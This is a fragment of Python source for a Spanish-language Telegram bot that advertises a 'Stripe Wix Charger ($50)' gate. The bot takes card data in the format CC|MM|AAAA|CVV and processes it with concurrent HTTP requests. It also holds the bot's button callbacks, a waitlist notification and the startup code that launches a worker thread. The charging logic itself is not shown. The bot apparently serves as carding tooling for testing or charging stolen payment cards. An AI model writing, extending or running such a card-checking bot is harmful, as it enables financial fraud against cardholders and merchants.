            "💳 <b>Gate Activo:</b> Stripe Wix Charger ($50)\n"
            "⚡ <b>Velocidad:</b> Peticiones HTTP concurrentes.\n"
            "📌 <b>Formato:</b> <code>CC|MM|AAAA|CVV</code>"
        )
        bot.send_message(chat_id, inst, parse_mode="HTML")
    elif call.data == "btn_avisar":
        with espera_lock:
            usuarios_espera_alerta.add(chat_id)
        bot.send_message(chat_id, "🔔 Te notificaremos cuando el bot esté libre.", parse_mode="HTML")


if __name__ == "__main__":
    threading.Thread(target=worker_principal, daemon=True, name="Worker-HTTP").start()
    print("🤖 Bot de Telegram con Stripe Wix Charger en marcha...")
    bot.infinity_polling(timeout=20, long_polling_timeout=10)
